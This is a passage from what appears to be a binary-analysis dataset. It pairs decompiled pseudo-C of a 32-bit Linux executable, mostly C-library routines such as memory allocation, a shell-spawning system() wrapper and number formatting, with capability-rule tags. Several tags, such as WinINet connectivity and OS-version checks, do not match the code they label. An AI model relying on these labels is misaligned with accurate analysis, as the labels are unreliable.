0x8058974);\n            }\n            else {\n                *0x8058980 = iVar14;\n                uVar16 = fcn.080503fb();\n                iVar14 = uVar16 * 8;\n                iStack64 = *(iVar14 + 0x8058974);\n                iVar15 = iStack64;\n                iVar3 = iStack64;\n                if ((iStack64 != iVar14 + 0x805896c) &&\n                   (iVar15 = *(iVar14 + 0x8058978),  iVar3 = iVar14 + 0x805896c,  *(iVar15 + 4) <= uVar10)) {\n                    for (; (uVar10 | 1) < *(iStack64 + 4); iStack64 = *(iStack64 + 8)) {\n                    }\n                    iVar15 = *(iStack64 + 0xc);\n                    iVar3 = iStack64;\n                }\n            }\n            iStack64 = iVar3;\n            puVar1 = (uVar16 >> 5) * 4 + 0x8058c74;\n            *puVar1 = *puVar1 | 1 << (uVar16 & 0x1f);\n            *(iVar7 + 0xc) = iVar15;\n            *(iVar7 + 8) = iStack64;\n            *(iVar15 + 8) = iVar7;\n            *(iStack64 + 0xc) = iVar7;\n        }\n        if (uStack56 < 0x100) {\ncode_r0x080506a3:\n            uStack40 = uStack40 + 1;\n            uVar16 = uStack40 >> 5;\n            iVar7 = uStack40 * 8 + 0x805896c;\n            uVar9 = *(uVar16 * 4 + 0x8058c74);\n            uVar10 = 1 << (uStack40 & 0x1f);\n            while( true ) {\n                if ((uVar9 < uVar10) || (uVar10 == 0)) {\n                    do {\n                        uVar16 = uVar16 + 1;\n                        if (2 < uVar16) goto code_r0x08050780;\n                        uVar9 = *(uVar16 * 4 + 0x8058c74);\n                    } while (uVar9 == 0);\n                    uVar10 = 1;\n                    iVar7 = uVar16 * 0x100 + 0x805896c;\n                }\n                for (; (uVar9 & uVar10) == 0; uVar10 = uVar10 * 2) {\n                    iVar7 = iVar7 + 8;\n                }\n                iVar14 = *(iVar7 + 0xc);\n                if (iVar14 != iVar7) break;\n                iVar7 = iVar14 + 8;\n                uVar9 = uVar9 & ~uVar10;\n                uVar10 = uVar10 * 2;\n                *(uVar16 * 4 + 0x8058c74) = uVar9;\n            }\n            piVar5 = *(iVar14 + 0xc);\n            uVar9 = *(iVar14 + 4) & 0xfffffffc;\n            uVar10 = uVar9 - uStack56;\n            *(iVar7 + 0xc) = piVar5;\n            piVar5[2] = iVar7;\n            if (uVar10 < 0x10) {\n                puVar1 = iVar14 + 4 + uVar9;\n                *puVar1 = *puVar1 | 1;\n            }\n            else {\n                iVar7 = iVar14 + uStack56;\n                *0x805897c = iVar7;\n                *0x8058980 = iVar7;\n                *(iVar7 + 8) = 0x8058974;\n                *(iVar7 + 0xc) = 0x8058974;\n                if (uStack56 < 0x100) {\n                    *0x8058970 = iVar7;\n                }\n                piVar5 = uVar10 | 1;\n                *(iVar14 + 4) = uStack56 | 1;\n                *(iVar7 + uVar10) = uVar10;\n                *(iVar7 + 4) = piVar5;\n            }\n            piVar6 = iVar14 + 8;\n        }\n        else {\n            iVar7 = *(uStack40 * 8 + 0x8058978);\n            do {\n                iVar14 = iVar7;\n                if (iVar14 == uStack40 * 8 + 0x805896c) goto code_r0x080506a3;\n                iVar7 = *(iVar14 + 0xc);\n                uVar9 = *(iVar14 + 4) & 0xfffffffc;\n            } while (uVar9 < uStack56);\n            uVar19 = CONCAT44(*(iVar14 + 8), iVar14);\n            if ((*(*(iVar14 + 8) + 0xc) != iVar14) || (*(iVar7 + 8) != iVar14)) {\n                uVar19 = fcn.08051382();\n                iVar7 = extraout_ECX;\n            }\n            iVar14 = uVar19 >> 0x20;\n            piVar5 = uVar19;\n            uVar10 = uVar9 - uStack56;\n            *(iVar14 + 0xc) = iVar7;\n            *(iVar7 + 8) = iVar14;\n            piVar6 = piVar5 + 2;\n            if (uVar10 < 0x10) {\n                puVar1 = piVar5 + uVar9 + 4;\n                *puVar1 = *puVar1 | 1;\n            }\n            else {\n                iVar7 = piVar5 + uStack56;\n                piVar5[1] = uStack56 | 1;\n                piVar5 = uVar10 | 1;\n                *0x805897c = iVar7;\n                *0x8058980 = iVar7;\n                *(iVar7 + 8) = 0x8058974;\n                *(iVar7 + 0xc) = 0x8058974;\n                *(iVar7 + 4) = piVar5;\n                *(iVar7 + uVar10) = uVar10;\n            }\n        }\n    }\n    else {\n        piVar6 = *((uStack56 >> 1) + 0x805893c);\n        if (piVar6 == NULL) goto code_r0x080504c6;\n        piVar5 = piVar6[2];\n        *((uStack56 >> 1) + 0x805893c) = piVar5;\ncode_r0x080504ff:\n        piVar6 = piVar6 + 2;\n    }\ncode_r0x08050b7a:\n    fcn.08051b29(auStack32, 1, piVar5, piVar5);\n    return piVar6;\n}\n",
        "token_count": 4713
    },
    "08051382": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.08051382(void)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint uVar2;\n    ulong uVar3;\n    uint uStack272;\n    uint auStack268 [32];\n    uint uStack140;\n    uint auStack132 [32];\n    \n    fcn.08051b26(0x8056688);\n    iVar1 = 0x20;\n    while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n        auStack132[iVar1] = 0;\n    }\n    uVar3 = fcn.080531cd(auStack132, 6);\n    uVar2 = uVar3 >> 0x20;\n    if (uVar3 == 0) {\n        fcn.080523d2(1, auStack132, 0, extraout_ECX);\n        uVar2 = extraout_EDX;\n    }\n    if (*0x8058864 != '\\0') goto code_r0x08051409;\n    *0x8058864 = '\\x01';\n    while( true ) {\n        fcn.08051b26(0x8056688);\n        fcn.080530e2(6);\n        fcn.08051b26(0x8056688);\n        uVar2 = extraout_EDX_00;\ncode_r0x08051409:\n        if (*0x8058864 != '\\x01') break;\n        *0x8058864 = '\\x02';\n        fcn.0804fef9(&uStack272, 0, 0x8c, uVar2);\n        uStack272 = 0;\n        iVar1 = 0x20;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            auStack268[iVar1] = 0xffffffff;\n        }\n        uStack140 = 0;\n        fcn.08051d67(6, &uStack272, 0, iVar1);\n    }\n    if (*0x8058864 != '\\x02') {\n        if (*0x8058864 == '\\x03') {\n            *0x8058864 = 4;\n            fcn.0804ea83(0x7f);\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 552
    },
    "08051523": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.08051523(uint32_t **param_1, uint32_t *param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    \n    puVar1 = param_1[2];\n    if (param_1[3] == NULL) {\n        uVar3 = *puVar1 * 0x41c64e6d + 0x3039 & 0x7fffffff;\n        *puVar1 = uVar3;\n        *param_2 = uVar3;\n    }\n    else {\n        puVar4 = param_1[1];\n        puVar6 = *param_1;\n        puVar2 = param_1[6];\n        *puVar6 = *puVar6 + *puVar4;\n        puVar5 = puVar6 + 1;\n        *param_2 = *puVar6 >> 1;\n        puVar4 = puVar4 + 1;\n        puVar6 = puVar1;\n        if ((puVar5 < puVar2) && (puVar6 = puVar5,  puVar2 <= puVar4)) {\n            puVar4 = puVar1;\n        }\n        *param_1 = puVar6;\n        param_1[1] = puVar4;\n    }\n    return 0;\n}\n",
        "token_count": 327
    },
    "08051618": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.08051618(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uchar *puVar3;\n    int32_t iStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar auStack44 [12];\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    uVar1 = 1;\n    if (param_1 != 0) {\n        uStack56 = 1;\n        iStack60 = 3;\n        uStack52 = in_ECX;\n        uStack48 = in_ECX;\n        uStack32 = fcn.080530fa();\n        uStack56 = 1;\n        iStack60 = 2;\n        uStack28 = fcn.080530fa();\n        uStack56 = 0;\n        iStack60 = 0x11;\n        uStack24 = fcn.080530fa();\n        iVar2 = fcn.08051e40();\n        if (iVar2 < 0) {\n            uStack56 = uStack32;\n            iStack60 = 3;\n            fcn.080530fa();\n            uStack56 = uStack28;\n            iStack60 = 2;\n            fcn.080530fa();\n            uStack56 = uStack24;\n            iStack60 = 0x11;\n            fcn.080530fa();\n            uVar1 = 0xffffffff;\n        }\n        else {\n            uVar1 = extraout_ECX;\n            puVar3 = &stack0xffffffd4;\n            if (iVar2 == 0) {\n                uStack56 = 0;\n                iStack60 = 3;\n                uStack52 = extraout_ECX;\n                uStack48 = extraout_ECX;\n                fcn.080530fa();\n                uStack56 = 0;\n                iStack60 = 2;\n                fcn.080530fa();\n                iVar2 = iStack60;\n                uStack56 = 0;\n                iStack60 = 0x11;\n                fcn.080530fa();\n                iStack60 = 0;\n                fcn.080517b0(\"/bin/sh\", \"sh\", 0x8054e9a, param_1);\n                iStack60 = 0x7f;\n                fcn.0804ea83();\n                uVar1 = extraout_ECX_00;\n                puVar3 = &stack0xffffffc4;\n            }\n            *(puVar3 + -4) = uVar1;\n            *(puVar3 + -8) = uVar1;\n            *(puVar3 + -0xc) = 1;\n            *(puVar3 + -0x10) = 3;\n            *(puVar3 + -0x14) = 0x80516ee;\n            fcn.080530fa();\n            *(puVar3 + -0xc) = 1;\n            *(puVar3 + -0x10) = 2;\n            *(puVar3 + -0x14) = 0x80516f9;\n            fcn.080530fa();\n            *(puVar3 + -0x14) = 0;\n            *(puVar3 + -0x18) = 0;\n            *(puVar3 + -0x1c) = puVar3 + 0x24;\n            *(puVar3 + -0x20) = iVar2;\n            *(puVar3 + -0x24) = 0x8051708;\n            iVar2 = fcn.08052483();\n            iVar2 = iVar2 + 1;\n            if (iVar2 == 0) {\n                *(puVar3 + 0x24) = 0xffffffff;\n            }\n            *(puVar3 + -4) = iVar2;\n            *(puVar3 + -8) = iVar2;\n            *(puVar3 + -0xc) = *(puVar3 + 0xc);\n            *(puVar3 + -0x10) = 3;\n            *(puVar3 + -0x14) = 0x8051723;\n            fcn.080530fa();\n            *(puVar3 + -0xc) = *(puVar3 + 0x10);\n            *(puVar3 + -0x10) = 2;\n            *(puVar3 + -0x14) = 0x8051730;\n            fcn.080530fa();\n            *(puVar3 + -0xc) = *(puVar3 + 0x14);\n            *(puVar3 + -0x10) = 0x11;\n            *(puVar3 + -0x14) = 0x805173d;\n            fcn.080530fa();\n            uVar1 = *(puVar3 + 0x24);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 1081
    },
    "080517b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h_2\n\nvoid fcn.080517b0(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_bp_10h;\n    int32_t aiStack48 [8];\n    int32_t *var_ch;\n    uint var_8h_2;\n    \n    iVar6 = 0;\n    var_ch = &fcn.080517b0::var_bp_10h;\n    do {\n        iVar6 = iVar6 + 1;\n        iVar3 = *var_ch;\n        var_ch = var_ch + 1;\n    } while (iVar3 != 0);\n    iVar3 = -(iVar6 * 4 + 0x22U & 0xfffffff0);\n    puVar1 = &fcn.080517b0::var_ch + iVar3;\n    *puVar1 = var_ch_2;\n    var_ch = &fcn.080517b0::var_bp_10h;\n    puVar5 = puVar1;\n    do {\n        puVar4 = var_ch;\n        puVar5 = puVar5 + 1;\n        iVar6 = iVar6 + -1;\n        var_ch = var_ch + 1;\n        uVar2 = *puVar4;\n        *puVar5 = uVar2;\n    } while (iVar6 != 0);\n    *(&stack0xffffffe0 + iVar3) = uVar2;\n    *(&stack0xffffffdc + iVar3) = *0x8058870;\n    *(&stack0xffffffd8 + iVar3) = puVar1;\n    *(&stack0xffffffd4 + iVar3) = var_8h;\n    *(&stack0xffffffd0 + iVar3) = 0x8051812;\n    fcn.08051f12();\n    return;\n}\n",
        "token_count": 452
    },
    "08051b5e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x08051b84)\n\nvoid fcn.08051b5e(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int16_t iVar4;\n    uint *puVar5;\n    \n    if (*0x8058880 != '\\0') {\n        return;\n    }\n    *0x8058880 = 1;\n    *0x8058874 = 0x1000;\n    puVar5 = fcn.0804efb0();\n    uVar2 = *0x8056580;\n    uVar1 = *puVar5;\n    iVar4 = fcn.080500ed(0);\n    uVar3 = *0x80565d0;\n    *0x8056580 = *0x8056580 & 0xffff0000 | uVar2 ^ (1 - iVar4) * 0x100;\n    iVar4 = fcn.080500ed(1);\n    *0x80565d0 = *0x80565d0 & 0xffff0000 | uVar3 ^ (1 - iVar4) * 0x100;\n    *puVar5 = uVar1;\n    return;\n}\n",
        "token_count": 274
    },
    "08051b9e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x08051d05)\n// WARNING: Removing unreachable block (ram,0x08051ce1)\n// WARNING: Removing unreachable block (ram,0x08051d2e)\n\nint32_t fcn.08051b9e(code *param_1, int32_t param_2, uint32_t **param_3, code *param_4, uint param_5, uint param_6, \n                    uint param_7)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t **ppuVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    uint in_ECX;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uchar *puVar8;\n    uint uStack448;\n    uint uStack444;\n    uint uStack440;\n    uchar auStack436 [128];\n    uint uStack308;\n    uint32_t uStack304;\n    uint uStack300;\n    uchar auStack296 [120];\n    uint uStack176;\n    uchar *puStack172;\n    uint32_t **ppuStack168;\n    uint32_t **ppuStack164;\n    uint uStack160;\n    uint uStack156;\n    uint *puStack152;\n    uint *puStack148;\n    uchar auStack136 [52];\n    int32_t iStack84;\n    int32_t iStack44;\n    int32_t iStack36;\n    int32_t iStack28;\n    int32_t iStack20;\n    \n    *0x805886c = param_7;\n    *0x805887c = param_6;\n    ppuVar3 = param_3 + param_2;\n    *0x8058870 = ppuVar3 + 1;\n    if (ppuVar3 + 1 == *param_3) {\n        *0x8058870 = ppuVar3;\n    }\n    ppuStack164 = 0x78;\n    ppuStack168 = NULL;\n    puStack172 = &stack0xffffff78;\n    uStack176 = 0x8051bf9;\n    uStack160 = in_ECX;\n    fcn.0804fef9();\n    ppuVar3 = *0x8058870;\n    do {\n        puVar1 = *ppuVar3;\n        ppuVar3 = ppuVar3 + 1;\n        uStack160 = extraout_EDX;\n    } while (puVar1 != NULL);\n    for (; *ppuVar3 != NULL; ppuVar3 = ppuVar3 + 2) {\n        if (*ppuVar3 < 0xf) {\n            ppuStack164 = 0x8;\n            puStack172 = &stack0xffffff78 + *ppuVar3 * 8;\n            uStack176 = 0x8051c22;\n            ppuStack168 = ppuVar3;\n            fcn.0804feab();\n            uStack160 = extraout_EDX_00;\n        }\n    }\n    uStack160 = 0x8051c36;\n    fcn.080531ed();\n    uStack160 = 0x8051c3b;\n    fcn.08051b5e();\n    if (iStack84 == 0) {\n        iStack84 = 0x1000;\n    }\n    *0x8058874 = iStack84;\n    if (iStack44 == -1) {\n        uStack160 = 0x8051c58;\n        iVar4 = fcn.080521ef();\n        uStack160 = 0x8051c5f;\n        iVar5 = fcn.0805215e();\n        if (iVar4 == iVar5) {\n            uStack160 = 0x8051c68;\n            iVar4 = fcn.08052184();\n            uStack160 = 0x8051c6f;\n            iVar5 = fcn.08052138();\n            if (iVar4 == iVar5) goto code_r0x08051c73;\n        }\n    }\n    else {\ncode_r0x08051c73:\n        if ((iStack44 == -1) || ((iStack44 == iStack36 && (iStack28 == iStack20)))) goto code_r0x08051cbc;\n    }\n    uStack160 = 0x8051c9e;\n    fcn.08051b2a();\n    uStack160 = 0x8051cad;\n    fcn.08051b2a();\n    uStack160 = 0x8051cbc;\n    fcn.08051b2a();\ncode_r0x08051cbc:\n    *0x8056778 = *param_3;\n    *0x8058878 = param_5;\n    if (param_4 != NULL) {\n        uStack160 = 0x8051cf3;\n        (*param_4)();\n    }\n    uStack160 = 0x8051d1f;\n    puVar6 = fcn.0804efb0();\n    *puVar6 = 0;\n    uStack160 = 0;\n    ppuStack164 = *0x8058870;\n    ppuStack168 = param_3;\n    puStack172 = param_2;\n    uStack176 = 0x8051d4f;\n    puStack172 = (*param_1)();\n    uStack176 = 0x8051d57;\n    fcn.08051749();\n    pcVar2 = swi(0x80);\n    (*pcVar2)();\n    pcVar2 = swi(0x80);\n    (*pcVar2)();\n    ppuStack164 = NULL;\n    ppuStack168 = NULL;\n    if (puStack152 != NULL) {\n        uStack308 = *puStack152;\n        fcn.0804feab(&stack0xfffffed8, puStack152 + 1, 0x80, extraout_EDX_01);\n        uStack304 = puStack152[0x21] | 0x4000000;\n        uStack300 = 0x8051d58;\n        if ((*(puStack152 + 0x21) & 4) == 0) {\n            uStack300 = 0x8051d5f;\n        }\n    }\n    puVar8 = NULL;\n    if (puStack148 != NULL) {\n        puVar8 = &stack0xfffffe40;\n    }\n    puVar7 = NULL;\n    if (puStack152 != NULL) {\n        puVar7 = &stack0xfffffecc;\n    }\n    iVar4 = fcn.08051ea5(uStack156, puVar7, puVar8, 8);\n    if ((puStack148 != NULL) && (-1 < iVar4)) {\n        *puStack148 = uStack448;\n        fcn.0804feab(puStack148 + 1, &stack0xfffffe4c, 0x80, uStack448);\n        puStack148[0x21] = uStack444;\n        puStack148[0x22] = uStack440;\n    }\n    return iVar4;\n}\n",
        "token_count": 1580
    },
    "08052384": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.08052384(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uStack12;\n    \n    if (((*0x8058888 == 0) && (iVar1 = fcn.080531ff(0),  iVar1 < 0)) ||\n       ((iVar1 = *0x8058888,  param_1 != 0 && (iVar2 = fcn.080531ff(*0x8058888 + param_1),  iVar2 < 0)))) {\n        iVar1 = -1;\n    }\n    return CONCAT44(uStack12, iVar1);\n}\n",
        "token_count": 142
    },
    "080523d2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.080523d2(uint32_t param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint uStack12;\n    \n    if ((param_2 == 0) || (param_1 < 3)) {\n        pcVar1 = swi(0x80);\n        uVar3 = (*pcVar1)();\n        puVar2 = &stack0xfffffff8;\n        if (0xfffff000 < uVar3) {\n            uStack12 = 0x805241a;\n            piVar4 = fcn.0804efb0();\n            *piVar4 = -uVar3;\n            uVar3 = 0xffffffff;\n            puVar2 = &stack0xfffffff8;\n        }\n    }\n    else {\n        puVar2 = fcn.0804efb0();\n        *puVar2 = 0x16;\n        uVar3 = 0xffffffff;\n        puVar2 = &stack0xfffffff4;\n    }\n    return CONCAT44(*puVar2, uVar3);\n}\n",
        "token_count": 256
    },
    "080525a6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __regparm2 fcn.080525a6(uint param_1, uint param_2, uint16_t *param_3, char *param_4, uint32_t param_5)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    ulong uVar7;\n    \n    uVar5 = param_5;\n    while( true ) {\n        if (uVar5 == 0) {\n            return param_5;\n        }\n        uVar3 = uVar5;\n        if (uVar5 < 0) {\n            uVar3 = 0x7fffffff;\n        }\n        uVar7 = fcn.0804ed18(*(param_3 + 2), param_4, uVar3, param_2);\n        param_2 = uVar7 >> 0x20;\n        iVar2 = uVar7;\n        if (iVar2 < 0) break;\n        uVar5 = uVar5 - iVar2;\n        param_4 = param_4 + iVar2;\n    }\n    pcVar4 = *(param_3 + 4);\n    *param_3 = *param_3 | 8;\n    uVar3 = *(param_3 + 6) - pcVar4;\n    if (uVar3 != 0) {\n        uVar6 = uVar5;\n        if (uVar3 <= uVar5) {\n            uVar6 = uVar3;\n        }\n        while ((cVar1 = *param_4,  *pcVar4 = cVar1,  cVar1 != '\\n' || ((*(param_3 + 1) & 1) == 0))) {\n            pcVar4 = pcVar4 + 1;\n            uVar6 = uVar6 - 1;\n            if (uVar6 == 0) break;\n            param_4 = param_4 + 1;\n        }\n        *(param_3 + 8) = pcVar4;\n        uVar5 = uVar5 - (pcVar4 - *(param_3 + 4));\n    }\n    return param_5 - uVar5;\n}\n",
        "token_count": 492
    },
    "08052714": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.08052714(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack12;\n    \n    uVar2 = *param_1;\n    if ((param_2 & uVar2 & 0xffff) == 0) {\n        if ((uVar2 & 0x880) == 0) {\n            *param_1 = uVar2 | param_2;\n            goto code_r0x08052736;\n        }\ncode_r0x0805273e:\n        puVar3 = fcn.0804efb0();\n        *puVar3 = 9;\n    }\n    else {\ncode_r0x08052736:\n        uVar1 = *param_1;\n        if ((uVar1 & 0x20) != 0) goto code_r0x0805273e;\n        if ((uVar1 & 3) == 0) {\ncode_r0x08052798:\n            *param_1 = *param_1 | 0x40;\n            uVar5 = 0;\n            if ((*param_1 & 0xb00) == 0) {\n                param_1[7] = param_1[3];\n            }\n            goto code_r0x080527ac;\n        }\n        if (((uVar1 & 4) != 0) || ((param_1[5] == param_1[4] && ((uVar1 & 2) == 0)))) {\ncode_r0x08052788:\n            *param_1 = *param_1 & 0xfffc;\n            uVar2 = param_1[2];\n            param_1[6] = uVar2;\n            param_1[4] = uVar2;\n            param_1[5] = uVar2;\n            goto code_r0x08052798;\n        }\n        iVar4 = fcn.0805324a(param_1, 0, 2 - ((uVar1 & 0x400) == 0), uVar1 & 0x400);\n        if (iVar4 == 0) goto code_r0x08052788;\n    }\n    *param_1 = *param_1 | 8;\n    uVar5 = 0xffffffff;\ncode_r0x080527ac:\n    return CONCAT44(uStack12, uVar5);\n}\n",
        "token_count": 547
    },
    "080527b2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.080527b2(uint32_t param_1, uint64_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    if (param_3 < 0) {\n        if ((param_1 & 0x800) == 0) {\n            uVar1 = *param_2;\n            if (param_1 == 0x100) {\n                uVar1 = uVar1;\n            }\n            else if (param_1 == 0x200) {\n                uVar1 = uVar1;\n            }\n            return uVar1;\n        }\n    }\n    else if ((param_1 & 0x800) == 0) {\n        uVar1 = *param_2;\n        if (param_1 == 0x100) {\n            uVar1 = uVar1 & 0xff;\n        }\n        else if (param_1 == 0x200) {\n            uVar1 = uVar1 & 0xffff;\n        }\n        return uVar1;\n    }\n    return *param_2;\n}\n",
        "token_count": 241
    },
    "08052845": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.08052845(char *param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4, char param_5)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    char cVar3;\n    char *pcVar4;\n    bool bVar5;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    if ((param_4 < 0) && (param_4 = -param_4,  param_3 < 0)) {\n        bVar5 = param_2 != 0;\n        param_2 = -param_2;\n        bVar1 = true;\n        param_3 = -(param_3 + bVar5);\n    }\n    else {\n        bVar1 = false;\n    }\n    iStack24 = 0xffffffff / param_4;\n    uStack20 = 0xffffffff % param_4 + 1;\n    *param_1 = '\\0';\n    if (uStack20 == param_4) {\n        iStack24 = iStack24 + 1;\n        uStack20 = 0;\n    }\n    do {\n        pcVar4 = param_1;\n        if (param_3 == 0) {\n            uVar2 = param_2 / param_4;\n        }\n        else {\n            uVar2 = param_2 / param_4;\n            param_2 = param_2 % param_4 + uStack20 * (param_3 % param_4);\n            uVar2 = uVar2 + (param_3 % param_4) * iStack24 + param_2 / param_4;\n            param_3 = param_3 / param_4;\n        }\n        param_1 = pcVar4 + -1;\n        cVar3 = param_2 % param_4;\n        if (param_2 % param_4 < 10) {\n            cVar3 = cVar3 + '0';\n        }\n        else {\n            cVar3 = cVar3 + param_5;\n        }\n        *param_1 = cVar3;\n        param_2 = uVar2;\n    } while ((uVar2 | param_3) != 0);\n    if (bVar1) {\n        param_1 = pcVar4 + -2;\n        *param_1 = '-';\n    }\n    return param_1;\n}\n",
        "token_count": 520
    },
    "08052916": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x080529ab)\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.08052916(uint param_1, float10 param_2, int32_t *param_3, code *param_4)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    char cVar11;\n    char *pcVar12;\n    float10 fVar13;\n    float10 fVar14;\n    char *pcStack220;\n    int32_t iStack216;\n    char *pcStack212;\n    uint8_t uStack206;\n    uint8_t uStack197;\n    uint32_t uStack196;\n    int32_t iStack168;\n    uint32_t uStack164;\n    char *pcStack160;\n    uint uStack156;\n    int32_t iStack152;\n    char *pcStack148;\n    int32_t iStack144;\n    char *pcStack140;\n    char *pcStack136;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint uStack124;\n    int32_t aiStack120 [12];\n    char acStack72 [3];\n    char acStack69 [20];\n    char acStack49 [7];\n    char cStack42;\n    char acStack30 [8];\n    char cStack22;\n    uchar uStack21;\n    \n    iStack216 = param_3[1];\n    uStack206 = *(param_3 + 2);\n    iVar9 = *param_3;\n    cStack42 = 'e';\n    if ((uStack206 | 0x20) == 0x61) {\n        uStack206 = uStack206 + 6;\n    }\n    if (iVar9 < 0) {\n        iVar9 = 6;\n    }\n    acStack30[4] = '\\0';\n    if ((param_3[3] & 2U) == 0) {\n        if ((param_3[3] & 1U) != 0) {\n            acStack30[4] = ' ';\n        }\n    }\n    else {\n        acStack30[4] = '+';\n    }\n    acStack30[5] = 0;\n    pcStack148 